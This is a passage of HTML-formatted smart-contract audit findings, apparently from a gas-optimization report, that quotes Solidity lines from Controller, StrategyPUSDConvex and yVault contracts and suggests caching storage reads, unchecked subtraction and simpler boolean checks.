class=\"mtk12\">totalDebtPortion</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">minusPortion</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@audit gas: SLOAD 2 totalDebtPortion (could&#39;ve used cached value for calculation)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">791</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">totalDebtAmount</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@audit gas: SLOAD 2 totalDebtAmount (could&#39;ve used cached value for calculation)</span></span></span></code></pre>\n<h2 id=\"g-23-controllersetstrategy-boolean-comparison-l87\" style=\"position:relative;\"><a href=\"#g-23-controllersetstrategy-boolean-comparison-l87\" aria-label=\"g 23 controllersetstrategy boolean comparison l87 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-23] <code>Controller.setStrategy()</code>: boolean comparison L87</h2>\n<p>Comparing to a constant (<code>true</code> or <code>false</code>) is a bit more expensive than directly checking the returned boolean value.\nI suggest using <code>if(directValue)</code> instead of <code>if(directValue == true)</code> and <code>if(!directValue)</code> instead of <code>if(directValue == false)</code> here (see <code>@audit</code> tag):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"66\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">82</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setStrategy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">IStrategy</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_strategy</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">83:         </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">84:         </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">STRATEGIST_ROLE</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">85:     {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">86</span><span class=\"mtk1\">:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">87</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">approvedStrategies</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_strategy</span><span class=\"mtk1\">] == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk3\">//@audit gas: instead of comparing to a constant, just use &quot;approvedStrategies[_token][_strategy]&quot;</span></span></span></code></pre>\n<h2 id=\"g-24-strategypusdconvexbalanceofjpeg-jpeg-should-get-cached\" style=\"position:relative;\"><a href=\"#g-24-strategypusdconvexbalanceofjpeg-jpeg-should-get-cached\" aria-label=\"g 24 strategypusdconvexbalanceofjpeg jpeg should get cached permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-24] <code>StrategyPUSDConvex.balanceOfJPEG()</code>: <code>jpeg</code> should get cached</h2>\n<p>See <code>@audit</code> tags:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"67\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">226</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">balanceOfJPEG</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">227</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">availableBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">jpeg</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">//@audit gas: SLOAD 1 jpeg</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">231</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter\" aria-hidden=\"true\"></span><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-gutter-pad\"></span><span class=\"grvsc-gutter grvsc-line-number\" aria-hidden=\"true\" data-content=\"227\"></span><span class=\"grvsc-source\"><span class=\"mtk7\">233</span><span class=\"mtk1\">:             </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">jpeg</span><span class=\"mtk1\">) == </span><span class=\"mtk12\">extraReward</span><span class=\"mtk1\">.</span><span class=\"mtk11\">rewardToken</span><span class=\"mtk1\">()) { </span></span></span></code></pre>\n<h2 id=\"g-25-strategypusdconvexbalanceofjpeg-use-a-return-statement-instead-of-break\" style=\"position:relative;\"><a href=\"#g-25-strategypusdconvexbalanceofjpeg-use-a-return-statement-instead-of-break\" aria-label=\"g 25 strategypusdconvexbalanceofjpeg use a return statement instead of break permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-25] <code>StrategyPUSDConvex.balanceOfJPEG()</code>: use a <code>return</code> statement instead of <code>break</code></h2>\n<p>See <code>@audit</code> tag:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"68\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">226</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">balanceOfJPEG</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">231</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">233</span><span class=\"mtk1\">:             </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">jpeg</span><span class=\"mtk1\">) == </span><span class=\"mtk12\">extraReward</span><span class=\"mtk1\">.</span><span class=\"mtk11\">rewardToken</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">234</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">availableBalance</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">extraReward</span><span class=\"mtk1\">.</span><span class=\"mtk11\">earned</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">235</span><span class=\"mtk1\">:                 </span><span class=\"mtk3\">//we found jpeg, no need to continue the loop</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">236</span><span class=\"mtk1\">:                 </span><span class=\"mtk15\">break</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@audit gas: instead of adding to availableBalance &amp; breaking, just return here &quot;availableBalance + extraReward.earned()&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">237</span><span class=\"mtk1\">:             }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">238</span><span class=\"mtk1\">:         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">239</span><span class=\"mtk1\">: </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">240</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">availableBalance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">241</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p>Here, instead of making a memory operation with <code>availableBalance += extraReward.earned();</code> and then using <code>break;</code> before returning the memory variable <code>availableBalance</code>, it would’ve been more optimized to just return <code>availableBalance + extraReward.earned()</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"69\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">balanceOfJPEG</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">jpeg</span><span class=\"mtk1\">) == </span><span class=\"mtk12\">extraReward</span><span class=\"mtk1\">.</span><span class=\"mtk11\">rewardToken</span><span class=\"mtk1\">()) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">              </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">availableBalance</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">extraReward</span><span class=\"mtk1\">.</span><span class=\"mtk11\">earned</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h2 id=\"g-26-strategypusdconvexwithdraw-l281-should-be-unchecked-due-to-l279\" style=\"position:relative;\"><a href=\"#g-26-strategypusdconvexwithdraw-l281-should-be-unchecked-due-to-l279\" aria-label=\"g 26 strategypusdconvexwithdraw l281 should be unchecked due to l279 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-26] <code>StrategyPUSDConvex.withdraw()</code>: L281 should be unchecked due to L279</h2>\n<p>See <code>@audit</code> tag:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"70\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">273</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyController</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">279</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">280</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">convexConfig</span><span class=\"mtk1\">.</span><span class=\"mtk12\">baseRewardPool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdrawAndUnwrap</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">281</span><span class=\"mtk1\">:                 </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">balance</span><span class=\"mtk1\">, </span><span class=\"mtk3\">//@audit gas: should be unchecked (can&#39;t underflow due to L279)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">282</span><span class=\"mtk1\">:                 </span><span class=\"mtk4\">false</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">283</span><span class=\"mtk1\">:             );</span></span></span></code></pre>\n<h2 id=\"g-27-strategypusdconvexharvest-l362-should-be-unchecked-due-to-l359-l360-and-how-performancefee-is-set-l183\" style=\"position:relative;\"><a href=\"#g-27-strategypusdconvexharvest-l362-should-be-unchecked-due-to-l359-l360-and-how-performancefee-is-set-l183\" aria-label=\"g 27 strategypusdconvexharvest l362 should be unchecked due to l359 l360 and how performancefee is set l183 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-27] <code>StrategyPUSDConvex.harvest()</code>: L362 should be unchecked due to L359-L360 and how performanceFee is set L183</h2>\n<p>See <code>@audit</code> tags:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"71\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">177</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setPerformanceFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Rate</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_performanceFee</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">181:         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">182:             </span><span class=\"mtk10\">_performanceFee</span><span class=\"mtk1\">.</span><span class=\"mtk10\">denominator</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">183</span><span class=\"mtk1\">:                 </span><span class=\"mtk10\">_performanceFee</span><span class=\"mtk1\">.</span><span class=\"mtk10\">denominator</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">_performanceFee</span><span class=\"mtk1\">.</span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">, </span><span class=\"mtk3\">//@audit gas: can uncheck L362 thanks to this</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">184:             </span><span class=\"mtk8\">&quot;INVALID_RATE&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">185</span><span class=\"mtk1\">:         );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">311</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">harvest</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minOutCurve</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">STRATEGIST_ROLE</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">359</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fee</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">usdcBalance</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">performanceFee</span><span class=\"mtk1\">.</span><span class=\"mtk12\">numerator</span><span class=\"mtk1\">) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">360</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">performanceFee</span><span class=\"mtk1\">.</span><span class=\"mtk12\">denominator</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">361</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">usdc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">strategy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">feeAddress</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">362</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">usdcBalance</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">fee</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//@audit gas: should be unchecked (can&#39;t underflow due to L359-L360 &amp; how performanceFee is set L183)</span></span></span></code></pre>\n<h2 id=\"g-28-yvaultearn-token-and-controller-should-get-cached\" style=\"position:relative;\"><a href=\"#g-28-yvaultearn-token-and-controller-should-get-cached\" aria-label=\"g 28 yvaultearn token and controller should get cached permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-28] <code>yVault.earn()</code>: <code>token</code> and <code>controller</code> should get cached</h2>\n<p>See <code>@audit</code> tags:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"72\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">129</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">earn</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">130</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_bal</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">available</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">131</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">controller</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_bal</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//@audit gas: SLOADs 1 token &amp; controller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">132</span><span class=\"mtk1\">:         </span><span class=\"mtk12\">controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">earn</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_bal</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//@audit gas: SLOADs 2 token &amp; controller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">133</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<h2 id=\"g-29-yvaultwithdraw-l178-should-be-unchecked-due-to-l177\" style=\"position:relative;\"><a href=\"#g-29-yvaultwithdraw-l178-should-be-unchecked-due-to-l177\" aria-label=\"g 29 yvaultwithdraw l178 should be unchecked due to l177 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-29] <code>yVault.withdraw()</code>: L178 should be unchecked due to L177</h2>\n<p>See <code>@audit</code> tag:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"73\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">166</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_shares</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">noContract</span><span class=\"mtk1\">(msg.sender) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">177</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">vaultBalance</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">backingTokens</span><span class=\"mtk1\">) {</span></span></span>\n<span 